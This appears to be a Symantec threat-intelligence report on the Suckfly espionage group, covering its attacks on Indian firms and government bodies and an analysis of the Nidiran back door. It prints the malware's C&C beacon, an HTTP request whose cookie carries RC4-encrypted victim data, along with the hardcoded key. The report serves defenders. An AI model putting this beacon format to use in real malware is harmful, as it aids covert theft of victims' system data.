In March 2016, Symantec published a blog on Suckﬂy, an advanced cyberespionage group that conducted attacks
against a number of South Korean organizations to steal digital certiﬁcates. Since then we have identiﬁed a number
of attacks over a two-year period, beginning in April 2014, which we attribute to Suckﬂy. The attacks targeted highproﬁle targets, including government and commercial organizations. These attacks occurred in several different
countries, but our investigation revealed that the primary targets were individuals and organizations primarily
located in India.
While there have been several Suckﬂy campaigns that infected organizations with the group’s custom malware
Backdoor.Nidiran, the Indian targets show a greater amount of post-infection activity than targets in other regions.
This suggests that these attacks were part of a planned operation against speciﬁc targets in India.

Campaign activity in India
The ﬁrst known Suckﬂy campaign began in April of 2014. During our investigation of the campaign, we identiﬁed a
number of global targets across several industries who were attacked in 2015. Many of the targets we identiﬁed
were well known commercial organizations located in India. These organizations included:
One of India's largest ﬁnancial organizations
A large e-commerce company
The e-commerce company's primary shipping vendor
One of India's top ﬁve IT ﬁrms
A United States healthcare provider's Indian business unit
Two government organizations
Suckﬂy spent more time attacking the government networks compared to all but one of the commercial targets.
Additionally, one of the two government organizations had the highest infection rate of the Indian targets. Figure 1
shows the infection rate for each of the targets.

Figure 1. Infection rates of Indian targets
Indian government org #2 is responsible for implementing network software for different ministries and departments
within India's central government. The high infection rate for this target is likely because of its access to technology
and information related to other Indian government organizations.
Suckﬂy's attacks on government organizations that provide information technology services to other government
branches is not limited to India. It has conducted attacks on similar organizations in Saudi Arabia, likely because of
the access that those organizations have.
Suckﬂy's targets are displayed in ﬁgure 2 by their industry, which provides a clearer view of the group’s operations.
Most of the group's attacks are focused on government or technology related companies and organizations.

Suckﬂy attack lifecycle
One of the attacks we investigated provided detailed insight into how Suckﬂy conducts its operations. In 2015,
Suckﬂy conducted a multistage attack between April 22 and May 4 against an e-commerce organization based in
India. Similar to its other attacks, Suckﬂy used the Nidiran back door along with a number of hacktools to infect the
victim's internal hosts. The tools and malware used in this breach were also signed with stolen digital certiﬁcates.
During this time the following events took place:

Figure 3. Suckﬂy attack lifecycle
1. Suckﬂy's ﬁrst step was to identify a user to target so the attackers could attempt their initial breach into the ecommerce company's internal network. We don't have hard evidence of how Suckﬂy obtained information on
the targeted user, but we did ﬁnd a large open-source presence on the initial target. The target's job function,
corporate email address, information on work related projects, and publicly accessible personal blog could all
be freely found online.
2. On April 22, 2015, Suckﬂy exploited a vulnerability on the targeted employee's operating system (Windows)
that allowed the attackers to bypass the User Account Control and install the Nidiran back door to provide
access for their attack. While we know the attackers used a custom dropper to install the back door, we do
not know the delivery vector. Based on the amount of open-source information available on the target, it is
feasible that a spear-phishing email may have been used.
3. After the attackers successfully exploited the employee’s system, they gained access to the e-commerce
company's internal network. We found evidence that Suckﬂy used hacktools to move latterly and escalate
privileges. To do this the attackers used a signed credential-dumping tool to obtain the victim's account
credentials. With the account credentials, the attackers were able to access the victim's account and
navigate the internal corporate network as though they were the employee.
4. On April 27, the attackers scanned the corporate internal network for hosts with ports 8080, 5900, and 40
open. Ports 8080 and 5900 are common ports used with legitimate protocols, but can be abused by attackers
when they are not secured. It isn't clear why the attackers scanned for hosts with port 40 open because
there isn't a common protocol assigned to this port. Based on Suckﬂy scanning for common ports, it’s clear
that the group was looking to expand its foothold on the e-commerce company's internal network.
5. The attackers’ ﬁnal step was to exﬁltrate data off the victim’s network and onto Suckﬂy’s infrastructure. While
we know that the attackers used the Nidiran back door to steal information about the compromised
organization, we do not know if Suckﬂy was successful in stealing other information.
These steps were taken over a 13-day period, but only on speciﬁc days. While tracking what days of the week
Suckﬂy used its hacktools, we discovered that the group was only active Monday through Friday. There was no
activity from the group on weekends. We were able to determine this because the attackers’ hacktools are
command line driven and can provide insight into when the operators are behind keyboards actively working.
Figure 4 shows the attackers’ activity levels throughout the week.

Figure 4. Signed hacktools in use against targets, by day
This activity supports our theory, mentioned in the previous Suckﬂy blog , that this is a professional organized group.
Suckﬂy's command and control infrastructure
Suckﬂy made its malware difﬁcult to analyze to prevent their operations from being detected. However, we were
able to successfully analyze Suckﬂy malware samples and extract some of the communications between the
Nidiran back door and the Suckﬂy command and control (C&C) domains.
We analyzed the dropper, which is an executable that contains the following three ﬁles:
1. dllhost.exe: The main host for the .dll ﬁle
2. iviewers.dll: Used to load encrypted payloads and then decrypt them
3. msﬂed: The encrypted payload
All three ﬁles are required for the malware to run correctly. Once the malware has been executed, it checks to see if
it has a connection to the internet before running. If the connection test is successful, the malware runs and
attempts to communicate with the C&C domain over ports 443 and 8443. In the samples we analyzed we found the
port and C&C information encrypted and hardcoded into the Nidiran malware itself. The Nidiran back door made
the following initial communication request to the Suckﬂy C&C domain:
GET /gte_ok0/logon.php HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deﬂate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR
1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152;
.NET CLR 3.5.30729)
Host: REDACTED
Connection: Keep-Alive
Cookie:
dfe6=OIAXUNXWn9CBmFBqtwEEPLzwRGmbMoNR7C0nLcHYa+C1tb4fp7ydcZSmVZ1c4akergWcQQ==
The interesting information being transmitted to the C&C server in the initial request is located in the cookie which
is comprised of the following:
[COOKIE NAME]=[RC4 ENCRYPTED + B64 ENCODED DATA FROM VICTIM]
The key for the RC4 encryption in this sample is the hardcoded string “h0le”. Once the cookie data is decoded,
Suckﬂy has the network name, hostname, IP address, and the victim's operating system information.
Information about the C&C infrastructure identiﬁed in our analysis of Suckﬂy activity can be seen in Table 1.

Conclusion
Suckﬂy targeted one of India’s largest e-commerce companies, a major Indian shipping company, one of India’s
largest ﬁnancial organizations, and an IT ﬁrm that provides support for India’s largest stock exchange. All of these
targets are large corporations that play a major role in India’s economy. By targeting all of these organizations
together, Suckﬂy could have had a much larger impact on India and its economy. While we don't know the
motivations behind the attacks, the targeted commercial organizations, along with the targeted government
organizations, may point in this direction.
Suckﬂy has the resources to develop malware, purchase infrastructure, and conduct targeted attacks for years
while staying off the radar of security organizations. During this time they were able to steal digital certiﬁcates from
South Korean companies and launch attacks against Indian and Saudi Arabian government organizations. There is
no evidence that Suckﬂy gained any beneﬁts from attacking the government organizations, but someone else may
have beneﬁted from these attacks.
The nature of the Suckﬂy attacks suggests that it is unlikely that the threat group orchestrated these attacks on their
own. We believe that Suckﬂy will continue to target organizations in India and similar organizations in other
countries in order to provide economic insight to the organization behind Suckﬂy's operations.
